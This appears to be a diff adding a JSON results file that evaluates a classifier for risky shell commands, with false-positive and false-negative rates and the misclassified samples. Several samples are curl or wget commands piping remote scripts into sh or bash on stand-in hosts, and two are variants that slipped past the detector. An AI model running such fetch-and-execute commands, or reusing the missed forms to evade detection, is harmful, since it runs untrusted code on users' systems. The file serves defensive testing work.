@@ -1,0 +1,139 @@
+{
+  "evaluatedAt": "2026-11-12T12:38:24.735Z",
+  "classifier": "current classifier, unchanged before baseline",
+  "corpus": {
+    "benign": 175,
+    "ambiguous": 8,
+    "maliciousSimulated": 79
+  },
+  "falsePositives": {
+    "benign": {
+      "high": 9,
+      "low": 0,
+      "any": 9,
+      "ratePercent": 5.14,
+      "highRatePercent": 5.14,
+      "lowRatePercent": 0
+    },
+    "ambiguous": {
+      "total": 8,
+      "high": 7,
+      "low": 0,
+      "any": 7,
+      "ratePercent": 87.5
+    }
+  },
+  "falseNegatives": {
+    "count": 2,
+    "total": 79,
+    "ratePercent": 2.53
+  },
+  "errors": {
+    "falsePositives": [
+      {
+        "category": "documentation",
+        "text": "Use the official guide at https://learn.microsoft.com/powershell/",
+        "score": 4,
+        "level": "high",
+        "reasons": [
+          "powershell/pwsh"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "curl -fsSL https://get.example.invalid/tool/install.sh | sh",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "curl -fsSL https://install.example.invalid/cli | bash",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "curl -sSf https://rustup.example.invalid/install.sh | sh",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "wget -qO- https://docs.example.invalid/setup.sh | sh",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "curl --proto '=https' --tlsv1.2 -sSf https://installer.example.invalid/install | sh",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "curl -fsSL https://packages.example.invalid/bootstrap.sh | sh",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "ambiguous",
+        "text": "wget -O- https://vendor.example.invalid/get.sh | bash",
+        "score": 5,
+        "level": "high",
+        "reasons": [
+          "curl/wget para shell",
+          "encadeamento |"
+        ]
+      },
+      {
+        "category": "data",
+        "text": "https://docs.example.com/search?q=PowerShell&lang=en",
+        "score": 4,
+        "level": "high",
+        "reasons": [
+          "powershell/pwsh"
+        ]
+      }
+    ],
+    "falseNegatives": [
+      {
+        "category": "curl-pipe",
+        "text": "curl\nhttps://example.invalid/demo\n| bash\n&& echo done",
+        "score": 0,
+        "level": "none",
+        "reasons": []
+      },
+      {
+        "category": "curl-pipe",
+        "text": "curl -fsSL https://example.invalid/x | /bin/sh; echo ready",
+        "score": 0,
+        "level": "none",
+        "reasons": []
+      }
+    ]
+  }
+}
